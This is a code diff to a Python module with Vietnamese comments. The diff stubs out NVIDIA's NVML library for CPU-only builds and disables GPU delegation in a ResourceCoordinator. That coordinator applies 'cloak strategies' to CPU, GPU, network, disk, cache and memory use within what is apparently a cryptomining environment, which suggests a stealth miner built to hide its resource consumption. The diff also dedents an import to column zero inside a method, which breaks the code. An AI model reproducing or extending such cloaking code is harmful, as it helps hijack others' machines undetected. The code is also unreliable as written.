@@ -20,7 +20,16 @@ import threading
 import subprocess
 import re
 import glob
-import pynvml
+# NVML optional: stub khi không có
+try:
+    import pynvml  # type: ignore
+except ImportError:  # CPU-only môi trường
+    class _DummyNVML:  # minimal stub để tránh ImportError
+        class NVMLError(Exception):
+            pass
+        def __getattr__(self, _name):
+            raise _DummyNVML.NVMLError("NVML unavailable (CPU-only build)")
+    pynvml = _DummyNVML()  # type: ignore
 from typing import Dict, Any, List, Optional, Set, Union
 from concurrent.futures import ThreadPoolExecutor
 import signal
@@ -2524,11 +2533,11 @@ class ResourceCoordinator:
         self.resource_managers = {}
         
         # Import strategies
-        from .cloak_strategies import (
-            CpuCloakStrategy, GpuCloakStrategy, NetworkCloakStrategy,
-            DiskIoCloakStrategy, CacheCloakStrategy, MemoryCloakStrategy,
-            StrategyType
-        )
+from .cloak_strategies import (
+    CpuCloakStrategy, GpuCloakStrategy, NetworkCloakStrategy,
+    DiskIoCloakStrategy, CacheCloakStrategy, MemoryCloakStrategy,
+    StrategyType
+)
         
         # ✅ ENHANCED: Use shared resource managers from singleton factory
         try:
@@ -2552,7 +2561,8 @@ class ResourceCoordinator:
         # Khởi tạo strategies
         self.strategies = {
             StrategyType.CPU: CpuCloakStrategy(config, logger, self.resource_managers.get('cpu')),
-            StrategyType.GPU: GpuCloakStrategy(config, logger, self.resource_managers.get('gpu')),
+            # (ĐÃ GỠ) GPU strategy trở thành placeholder vô hiệu hoá
+            StrategyType.GPU: GpuCloakStrategy(config, logger, None),
             StrategyType.NETWORK: NetworkCloakStrategy(config, logger, self.resource_managers.get('network')),
             StrategyType.DISK_IO: DiskIoCloakStrategy(config, logger, self.resource_managers.get('disk_io')),
             StrategyType.CACHE: CacheCloakStrategy(config, logger, self.resource_managers.get('cache')),
@@ -2699,34 +2709,9 @@ class ResourceCoordinator:
                 
             # GPU plugin delegation
             elif strategy_type == StrategyType.GPU:
-                gpu_manager = self.resource_managers.get('gpu')
-                if not gpu_manager:
-                    self.logger.error("❌ Không tìm thấy GPU resource manager")
-                    return False
-                
-                # Import gpu_plugins system
-                try:
-                    from mining_environment.gpu_plugins import apply_gpu_strategies
-                    
-                    # Apply GPU strategies thông qua plugin system
-                    success = apply_gpu_strategies(process.pid, strategies=None)
-                    if success:
-                        self.logger.info(f"✅ Đã ủy quyền chiến lược GPU cho plugin system, PID={process.pid}")
-                        return True
-                    else:
-                        self.logger.error(f"❌ GPU plugin delegation thất bại cho PID={process.pid}")
-                        return False
-                        
-                except ImportError as e:
-                    self.logger.error(f"❌ Không thể import GPU plugins: {e}")
-                    # Fallback to direct execution
-                    self.logger.warning("⚠️ Fallback to direct GPU strategy execution")
-                    strategy.apply(process)
-                    return True
-                    
-                except Exception as e:
-                    self.logger.error(f"❌ Lỗi GPU plugin delegation: {e}")
-                    return False
+                # (ĐÃ GỠ) GPU delegation/plug-in bị vô hiệu hóa trong bản CPU-only
+                self.logger.info("[GPU Delegation] Disabled – skipping GPU strategy delegation")
+                return False
             
             self.logger.warning(f"⚠️ Không hỗ trợ ủy quyền cho plugin system với chiến lược {strategy_type}")
             return False
